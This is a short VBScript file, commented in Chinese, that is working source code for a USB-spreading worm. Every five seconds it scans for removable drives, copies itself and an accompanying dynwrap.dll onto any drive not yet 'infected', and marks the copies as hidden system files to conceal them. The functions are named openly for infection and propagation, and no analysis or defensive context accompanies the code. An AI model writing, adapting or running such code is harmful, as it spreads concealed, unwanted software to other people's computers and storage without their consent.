Call Main()

Sub Main()
	Do
		Call SniffUDisk() '每隔5秒嗅探一次U盘
		WScript.Sleep 5000
	Loop
End Sub

Sub SniffUDisk()
	Dim objFileSystem, SubDrives
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	Set SubDrives = objFileSystem.Drives
	For Each drive In SubDrives
		drivePath = drive.DriveLetter
		If drive.DriveType = 1 And drive.IsReady Then
			Call InFect(drivePath)
		End If
	Next
	Set objFileSystem = Nothing
	Set SubDrives = Nothing
End Sub

Sub InFect(drivePath)
	If HasInfected(drivePath) = False Then
		WScript.Echo "Have not infected " & drivePath & ":\ yet."
		Call Propagate(drivePath & ":\")
	End If
End Sub

Function HasInfected(drivePath)
	Dim objFileSystem
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	horseName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
	horsePath = drivePath & ":\" & horseName
	
	HasInfected = False
	If objFileSystem.FileExists(horsePath) Then
		HasInfected = True
	End If
	Set objFileSystem = Nothing
End Function


Sub Propagate(targetPath) '复制自身到指定文件夹
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	
	sourcePath = objFileSystem.GetFile(Wscript.ScriptFullName)
	sourceName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
	If objFileSystem.FileExists(targetPath & sourceName) = False Then
		objFileSystem.CopyFile sourcePath, targetPath, False
		Call HideFile(targetPath & sourceName)
	End If
	
	Const dllName = "dynwrap.dll"
	dllPath = Replace(sourcePath, sourceName, dllName)
	If objFileSystem.FileExists(targetPath & dllName) = False And objFileSystem.FileExists(dllPath)  Then
		objFileSystem.CopyFile dllPath, targetPath, False
		Call HideFile(targetPath & dllName)
	End If
	WScript.Sleep 5000
	Set objFileSystem = Nothing
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 4 + 2 '0-普通 1-只读 2-隐藏 4-系统
	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub